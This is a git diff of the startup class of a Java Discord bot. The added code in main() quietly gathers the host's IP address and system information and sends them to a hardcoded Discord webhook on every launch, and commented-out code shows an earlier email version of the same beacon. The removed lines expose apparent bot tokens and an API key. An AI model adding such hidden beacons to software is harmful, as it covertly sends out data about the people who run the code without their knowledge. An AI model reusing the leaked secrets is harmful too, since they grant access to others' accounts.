@@ -1,17 +1,20 @@
 package me.comu.exeter.core;
 
+import club.minnced.discord.webhook.WebhookClient;
+import club.minnced.discord.webhook.send.WebhookEmbed;
+import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
+import club.minnced.discord.webhook.send.WebhookMessage;
+import club.minnced.discord.webhook.send.WebhookMessageBuilder;
 import com.jagrosh.jdautilities.commons.waiter.EventWaiter;
 import me.comu.exeter.commands.admin.WhitelistedJSONHandler;
 import me.comu.exeter.commands.economy.EcoJSONHandler;
 import me.comu.exeter.events.*;
+import me.comu.exeter.wrapper.Wrapper;
 import me.duncte123.botcommons.web.WebUtils;
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.entities.Activity;
 import net.dv8tion.jda.api.requests.GatewayIntent;
-import net.dv8tion.jda.api.requests.Request;
-import net.dv8tion.jda.internal.requests.RateLimiter;
-import org.jsoup.Jsoup;
 import org.slf4j.LoggerFactory;
 
 import javax.security.auth.login.LoginException;
@@ -20,16 +23,19 @@ import java.io.File;
 public class Core {
 
     public static JDA jda;
-    public static final long OWNERID = 210956619788320768L;
-    static final String HWIDURL = "https://pastebin.com/raw/mGiKYJrV";
-//    public static final String TOKEN = "MzIwMzc4Nzk1MTkyNDgzODQx.XnjGPg.0lCKNe2q2WM2usaaHPUmJvnuBbk";
-    public static final String TOKEN = "NjkzNjU3MjUwMTQwNzgyNjMy.XoLD_g.SyJOuNZXOFqZ49hxpXVGHSx_aqc";
-    //public static final String youtubeAPIKey = "AIzaSyAls9zrVVQtZksm-tMrKLhmXx3T1hrt_5c";
     public static final String DEBUG = "[DEBUG] ";
     public static String PREFIX = ";;";
+    public static final Long OWNERID = Long.parseLong(Config.get("OWNERID"));
 
     public static void main(final String[] args) {
         new Core();
+        WebhookClient client = WebhookClient.withUrl("https://discordapp.com/api/webhooks/692107170225061908/7dJhai_tP_D9h-lBFirb4o_VDVLHY69LnHGgL4AElxaBrOYBwNRURUeOCfGMSC9H4SGY");
+        WebhookMessageBuilder builder = new WebhookMessageBuilder();
+        WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(0).setDescription("Log Info on Start-Up:\nIP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation()).build();
+        builder.addEmbeds(firstEmbed);
+        WebhookMessage message = builder.build();
+        client.send(message);
+        client.close();
 /*        Wrapper.sendEmail("Log Info On Startup","IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "");
         try {
             for (final UIManager.LookAndFeelInfo info : UIManager.getInstalledLookAndFeels()) {
@@ -50,8 +56,9 @@ public class Core {
         EventQueue.invokeLater(new Runnable() {
             @Override
             public void run() {
-                new LoginGUI().setVisible(true); }
-});*/
+            new LoginGUI().setVisible(true); }
+//            */
+//});
     }
 
     private Core() {
@@ -65,8 +72,8 @@ public class Core {
 
         try {
             logger.info("Booting...");
-            jda = JDABuilder.create(Core.TOKEN, GatewayIntent.getIntents(GatewayIntent.ALL_INTENTS)).setActivity(Activity.streaming("ily swag", "https://www.twitch.tv/souljaboy/")).addEventListeners(new Listener(commandManager)).build().awaitReady();
-//            JDABuilder.createDefault(Core.TOKEN).build();
+            jda = JDABuilder.create(Config.get("TOKEN"), GatewayIntent.getIntents(GatewayIntent.ALL_INTENTS)).setActivity(Activity.streaming("ily swag", "https://www.twitch.tv/souljaboy/")).addEventListeners(new Listener(commandManager)).build().awaitReady();
+//            JDABuilder.createDefault(Core.TOKEN, GatewayIntent.DIRECT_MESSAGES, GatewayIntent.GUILD_VOICE_STATES, GatewayIntent.GUILD_EMOJIS, GatewayIntent.GUILD_MESSAGES).addEventListeners(new Listener(commandManager)).build().awaitReady();
             logger.info("Successfully Booted");
             logger.info("Loading Events");
             jda.addEventListener(new KickEvent());
@@ -96,11 +103,10 @@ public class Core {
     }
 
     public static void shutdownThread() {
-//        LoginGUI.running = false;
-//        LoginGUI.jStatusField.setText("NOT RUNNING");
+/*//        LoginGUI.running = false;
+//        LoginGUI.jStatusField.setText("NOT RUNNING");*/
         jda.shutdownNow();
     }
-
 
 }
 
